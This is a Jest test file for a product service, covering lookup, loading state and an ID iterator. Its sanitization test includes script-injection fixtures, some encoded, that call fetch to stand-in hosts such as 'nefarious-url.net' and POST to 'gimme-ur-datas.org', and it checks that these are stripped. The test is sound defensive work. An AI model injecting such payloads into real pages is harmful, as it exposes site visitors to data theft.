import mockProducts from '../mocks/products.json';
import {
  configure,
  getIds,
  getProduct,
  getProductIdIterator,
  getProductIndex,
  getProducts,
  hasLoadedAllProducts,
  loadProducts,
  sanitizeProduct,
} from '../../src/services/products';

const reconfigure = () => {
  configure({
    // Ensure no mutations to mockProducts:
    products: new Map(JSON.parse(JSON.stringify(mockProducts)).map(
      product => [product.productId, product]
    )),
  });
};

const unconfigure = () => {
  configure({
    products: null,
  });
};

describe('get products', () => {
  beforeEach(reconfigure);

  test('gets product index', () => {
    expect(getProductIndex(mockProducts[3].productId)).toBe(3);
  });

  test('gets single product', () => {
    expect(getProduct(mockProducts[1].productId)).toEqual(Object.assign(
      {
        nextProductId: mockProducts[2].productId,
        previousProductId: mockProducts[0].productId,
      },
      mockProducts[1]
    ));
    expect(getProduct('bogus-id')).toBeUndefined();
  });

  test('gets all products', () => {
    expect(getProducts()).toEqual(mockProducts);
  });

  test('gets all product IDs', () => {
    expect(getIds()).toEqual(mockProducts.map(({ productId }) => productId));
  });

  test('sanitizes product values', () => {
    const regularString = 'Whatchu goin\' do?';
    const someHTML = '<h1>Please</h1>\n<ul>\n\t<li>don\'t</li>\n\t<li>kill</li>\n\t<li>my</li>\n</ul>\n<p>HTML</p>';
    const encodedHTML = '\u003cp\u003eSo very encoded\u003c/p\u003e';
    const scriptTag = '<p>Just minding my own business.</p>\n\n\n<script type="text/javascript">document.write(\'BAM! JavaScript.\')</script>';
    const encodedScriptTag = '\u003cdl\u003e\u003cdt\u003eInjection\u003c/dt\u003e\u003cdd\u003ethis string\u003c/dd\u003e\u003c/dl\u003e\u003cscript \u003efetch(\'https://nefarious-url.net/\')\u003c/script \u003e\u003cp\u003eMaybe pwned\u003c/p\u003e';
    const mixedScriptTag = '\u003cdiv\u003eSo naughty\u003c/div\u003e<script type="text/javascript"  >fetch("http://gimme-ur-datas.org", { method: "POST" })\u003c/script\u003e\u003cp\u003eVery naughty\u003c/p\u003e\u003cscript>document.write("secrets")</script\u003e\u003ch1/\u003eYo yo yo\u003c/h1\u003e';

    expect(sanitizeProduct(mockProducts[0]))
      .toEqual(mockProducts[0]);
    expect(sanitizeProduct({ regularString }).regularString)
      .toBe(regularString);
    expect(sanitizeProduct({ someHTML }).someHTML)
      .toBe(someHTML);
    expect(sanitizeProduct({ encodedHTML }).encodedHTML)
      .toBe(encodedHTML);
    expect(sanitizeProduct({ scriptTag }).scriptTag)
      .toBe('<p>Just minding my own business.</p>\n\n\n');
    expect(sanitizeProduct({ encodedScriptTag }).encodedScriptTag)
      .toBe(
        '\u003cdl\u003e\u003cdt\u003eInjection\u003c/dt\u003e\u003cdd\u003ethis string\u003c/dd\u003e\u003c/dl\u003e\u003cp\u003eMaybe pwned\u003c/p\u003e'
      );
    expect(sanitizeProduct({ mixedScriptTag }).mixedScriptTag)
      .toBe(
        '\u003cdiv\u003eSo naughty\u003c/div\u003e\u003cp\u003eVery naughty\u003c/p\u003e\u003ch1/\u003eYo yo yo\u003c/h1\u003e'
      );
  });
});

describe('loads products from API', () => {
  test('checks if all products loaded', () => {
    expect(hasLoadedAllProducts()).toBe(false);

    /* eslint-disable no-underscore-dangle */
    loadProducts.__lastResponseMeta = {
      totalProducts: 200,
    };

    expect(hasLoadedAllProducts()).toBe(false);

    reconfigure();

    expect(hasLoadedAllProducts()).toBe(false);

    loadProducts.__lastResponseMeta = {
      totalProducts: mockProducts.length,
    };

    expect(hasLoadedAllProducts()).toBe(true);

    loadProducts.__lastResponseMeta = null;
    /* eslint-enable no-underscore-dangle */
    unconfigure();
  });

  test('locks to  current request', () => {
    const currentRequest = {};

    expect.assertions(1);

    /* eslint-disable no-underscore-dangle */
    loadProducts.__currentRequest = currentRequest;

    expect(loadProducts()).toBe(currentRequest);

    loadProducts.__currentRequest = null;
    /* eslint-disable no-underscore-dangle */
  });

  test('empty when all fetched', () => {
    expect.assertions(1);

    reconfigure();

    loadProducts.__lastResponseMeta = {
      totalProducts: mockProducts.length,
    };

    /* eslint-enable no-underscore-dangle */
    return loadProducts()
      .then((response) => {
        loadProducts.__lastResponseMeta = null;
        unconfigure();
        expect(response).toEqual([]);
      })
      .catch((error) => {
        loadProducts.__lastResponseMeta = null;
        unconfigure();
        throw error;
      });
    /* eslint-disable no-underscore-dangle */
  });
});

describe('product ID iterator', () => {
  beforeEach(reconfigure);
  afterEach(unconfigure);

  test('throws with bad product ID', () => {
    expect(getProductIdIterator.bind(null, 'wat')).toThrow(/wat/);
  });

  test('outputs initial', () => {
    expect(getProductIdIterator(mockProducts[0].productId).initial).toEqual({
      hasNext: true,
      hasPrevious: false,
      value: mockProducts[0].productId,
    });
    expect(getProductIdIterator(mockProducts[1].productId).initial).toEqual({
      hasNext: true,
      hasPrevious: true,
      value: mockProducts[1].productId,
    });
    expect(
      getProductIdIterator(mockProducts[mockProducts.length - 1].productId)
        .initial
    )
      .toEqual({
        hasNext: false,
        hasPrevious: true,
        value: mockProducts[mockProducts.length - 1].productId,
      });
  });

  test('iterates to next', () => {
    const myIterator = getProductIdIterator(mockProducts[1].productId);

    expect(myIterator.next()).toEqual({
      hasNext: true,
      hasPrevious: true,
      value: mockProducts[2].productId,
    });
    expect(myIterator.next()).toEqual({
      hasNext: false,
      hasPrevious: true,
      value: mockProducts[3].productId,
    });
    expect(myIterator.next()).toEqual({
      hasNext: false,
      hasPrevious: true,
      value: mockProducts[3].productId,
    });
  });

  test('iterates to previous', () => {
    const myIterator = getProductIdIterator(mockProducts[2].productId);

    expect(myIterator.previous()).toEqual({
      hasNext: true,
      hasPrevious: true,
      value: mockProducts[1].productId,
    });
    expect(myIterator.previous()).toEqual({
      hasNext: true,
      hasPrevious: false,
      value: mockProducts[0].productId,
    });
    expect(myIterator.previous()).toEqual({
      hasNext: true,
      hasPrevious: false,
      value: mockProducts[0].productId,
    });
  });
});

